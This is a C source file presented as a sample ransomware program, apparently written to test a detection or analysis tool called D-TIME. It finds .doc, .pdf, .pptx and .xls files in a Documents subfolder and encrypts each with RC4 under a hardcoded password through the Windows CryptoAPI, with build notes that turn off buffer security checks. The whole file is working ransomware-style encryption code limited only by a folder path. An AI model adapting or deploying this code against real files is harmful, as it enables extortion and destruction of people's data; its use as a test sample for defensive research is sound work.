/*-------------------------------------------------------------------------------------------------
 *
 *      Sample Malware: Ransomeware
 *      Function      : Encrypt files
 *      Note 1        : For the testing purpose, only files in "Documents\DummyFiles" is encrypted
 *      Note 2        : Duplication of Handle required FindNextFile() is not supported by D-TIME for now
 *                      Thus Ransomeware should target threads of the same process while testing
 *      Requirement   : Existance of "Docuemnts\DummyFiles" and some files in it
 * 
 *-----------------------------------------------------------------------------------------------
 *
 *        Best built in Visual Studio 10
 *          Porject settings (Configuration Properties):
 * 
 *              1. C/C++ --> Advanced --> Calling convention
 *                 Set __stdcall (Gz)
 * 
 *              2. C/C++ --> Code Generation --> Buffer Security Check
 *                 Set NO
 * 
 *              3. Linker --> General --> Enable Incremental Linking
 *                 Set NO
 * 
 *              4. Linker --> System --> SubSystem
 *                 Set CONSOLE
 *
 *-----------------------------------------------------------------------------------------------*/

#define _GNU_SOURCE
//#include <stdio.h>
#include <Windows.h>
#include <shlwapi.h>
#include <Knownfolders.h>
#include <Shlobj.h>

#pragma comment(lib, "Shlwapi.lib")
#pragma comment (lib, "advapi32")

#define KEYLENGTH  0x00800000
#define ENCRYPT_ALGORITHM CALG_RC4 
#define ENCRYPT_BLOCK_SIZE 8 
#define PASSWORD "6G34I7S8R2WFZ4B0"

int extensionVarified(char* filename);
bool encryptFile(LPTSTR szSource, LPTSTR szDestination,
	LPTSTR szPassword);


int main() {
    char path[MAX_PATH];
	char ePath[MAX_PATH];
	size_t pathLen;
	
	SHGetFolderPathA(NULL, CSIDL_MYDOCUMENTS, NULL, SHGFP_TYPE_CURRENT, path);
	lstrcatA(path, "\\DummyFiles");
	strcpy(ePath, path);

	/* Iterate through files */
	WIN32_FIND_DATA ffd;
	HANDLE hFind;
	pathLen = strlen(path);
	path[pathLen]='\\'; path[pathLen+1]='*'; path[pathLen+2]=0;
	hFind = FindFirstFile(path, &ffd);
	path[pathLen+1]=0;  ePath[pathLen]='\\'; ePath[pathLen+1]=0;
	if (INVALID_HANDLE_VALUE != hFind) {
		do {
			// printf("File: %s\n", ffd.cFileName);
			if(extensionVarified(ffd.cFileName)==1){
				path[pathLen+1] = 0;
				lstrcatA(path, ffd.cFileName);
				ePath[pathLen+1] = 0;
				lstrcatA(ePath, "_");
				lstrcatA(ePath, ffd.cFileName);
				//printf("File: %s\n", path);
				encryptFile(path, ePath, PASSWORD);
			}
		} while(FindNextFile(hFind, &ffd) != 0);
		FindClose(hFind);
	}
	else {
		return -1;
	}
    return 0;
}


int extensionVarified(char* filename){
	if(strcmp(PathFindExtensionA(filename), ".doc")==0 ||
		strcmp(PathFindExtensionA(filename), ".pdf")==0 ||
		strcmp(PathFindExtensionA(filename), ".pptx")==0 ||
		strcmp(PathFindExtensionA(filename), ".xls")==0
		){
		return 1;
	}
	return -1;
}


bool encryptFile(LPTSTR pszSourceFile, LPTSTR pszDestinationFile,
	LPTSTR pszPassword){

	/* Declare and initialize local variables. */
    HANDLE hSourceFile = INVALID_HANDLE_VALUE;
    HANDLE hDestinationFile = INVALID_HANDLE_VALUE; 

    HCRYPTPROV hCryptProv = NULL; 
    HCRYPTKEY hKey = NULL; 
    HCRYPTKEY hXchgKey = NULL; 
    HCRYPTHASH hHash = NULL; 

    PBYTE pbKeyBlob = NULL; 
    DWORD dwKeyBlobLen; 

    PBYTE pbBuffer = NULL; 
    DWORD dwBlockLen; 
    DWORD dwBufferLen; 
    DWORD dwCount; 
     
    /* Open the source file. */ 
    if((hSourceFile = CreateFile(
        pszSourceFile, 
        FILE_READ_DATA,
        FILE_SHARE_READ,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL))==INVALID_HANDLE_VALUE){
		return false;
	}

    /* Open the destination file. */
    if((hDestinationFile = CreateFile(
        pszDestinationFile, 
        FILE_WRITE_DATA,
        FILE_SHARE_READ,
        NULL,
        OPEN_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL))==INVALID_HANDLE_VALUE){
		return false;
	}

    /* Get the handle to the default provider. */
    if(!CryptAcquireContext(
        &hCryptProv, 
        NULL, 
        MS_ENHANCED_PROV, 
        PROV_RSA_FULL, 
        0)){
		return false;
	}

    /* The file will be encrypted with a session key derived 
     * from a password.
     * The session key will be recreated when the file is 
     * decrypted only if the password used to create the key is 
     * available.
	 */

    /* Create a hash object. */
    if(!CryptCreateHash(
        hCryptProv, 
        CALG_MD5, 
        0, 
        0, 
        &hHash)){
		return false;
	}

    /* Hash the password. */
    if(!CryptHashData(
        hHash, 
        (BYTE *)pszPassword, 
        lstrlen(pszPassword), 
        0)){
		return false;
	}

    /* Derive a session key from the hash object. */
    if(!CryptDeriveKey(
        hCryptProv, 
        ENCRYPT_ALGORITHM, 
        hHash, 
        KEYLENGTH, 
        &hKey)){
		return false;
	}

    /* The session key is now ready. If it is not a key derived from 
     * a  password, the session key encrypted with the private key 
     * has been written to the destination file.
	 *
	 *
	 * Determine the number of bytes to encrypt at a time. 
     * This must be a multiple of ENCRYPT_BLOCK_SIZE.
     * ENCRYPT_BLOCK_SIZE is set by a #define statement.
	 */
    dwBlockLen = 1000 - 1000 % ENCRYPT_BLOCK_SIZE; 

    /* Determine the block size. If a block cipher is used, 
     * it must have room for an extra block. 
	 */
    if (ENCRYPT_BLOCK_SIZE > 1) {
        dwBufferLen = dwBlockLen + ENCRYPT_BLOCK_SIZE; 
    }
	else {
        dwBufferLen = dwBlockLen; 
    }
        
    /* Allocate memory. */
    pbBuffer = (BYTE *)malloc(dwBufferLen);

    /* In a do loop, encrypt the source file, 
     * and write to the source file. 
	 */
    bool fEOF = FALSE;
    do { 
        /* Read up to dwBlockLen bytes from the source file. */
        if(!ReadFile(
            hSourceFile, 
            pbBuffer, 
            dwBlockLen, 
            &dwCount, 
            NULL)){
			return false;
		}

        if (dwCount < dwBlockLen) {
            fEOF = TRUE;
        }

        /* Encrypt data. */
        if(!CryptEncrypt(
            hKey, 
            NULL, 
            fEOF,
            0, 
            pbBuffer, 
            &dwCount, 
            dwBufferLen)){
			return false;
		}

        /* Write the encrypted data to the destination file. */
        if(!WriteFile(
            hDestinationFile, 
            pbBuffer, 
            dwCount,
            &dwCount,
            NULL)){
			return false;
		}

        /* End the do loop when the last block of the source file 
         * has been read, encrypted, and written to the destination 
         * file.
		 */
    } while(!fEOF);

    /* Close files. */
    if (hSourceFile) {
        CloseHandle(hSourceFile);
    }

    if (hDestinationFile) {
        CloseHandle(hDestinationFile);
    }

    /* Free memory. */
    if (pbBuffer) {
        free(pbBuffer); 
    }
     

    /* Release the hash object. */
    if (hHash) {
        CryptDestroyHash(hHash);
        hHash = NULL;
    }

    /* Release the session key. */
    if (hKey) {
        CryptDestroyKey(hKey);
    }

    /* Release the provider handle. */
    if (hCryptProv) {
        CryptReleaseContext(hCryptProv, 0);
    }
    
    return true; 
} // End Encryptfile.
